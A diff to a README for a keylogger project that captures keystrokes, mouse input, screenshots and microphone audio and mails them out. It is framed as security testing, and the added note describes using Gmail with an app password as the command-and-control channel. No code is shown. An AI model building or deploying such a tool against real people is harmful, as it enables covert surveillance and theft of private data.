@@ -1,7 +1,8 @@
 # Inputs To Mail
 Get Keyboard, Mouse, ScreenShot, Microphone Inputs and Send to your Mail.  
 Purpose of the project is testing the security of information systems.
-
+## NOTE
+Here ,we use the google gmail as our C2 server,so as of first, we need to create an app password for this keylogger file from gmail, and add it in the code part and our mail id(can be a backup or original mail id)
 ## INSTALLATION
 
 **You don't need to do anything for installation. Just run the executable.**  
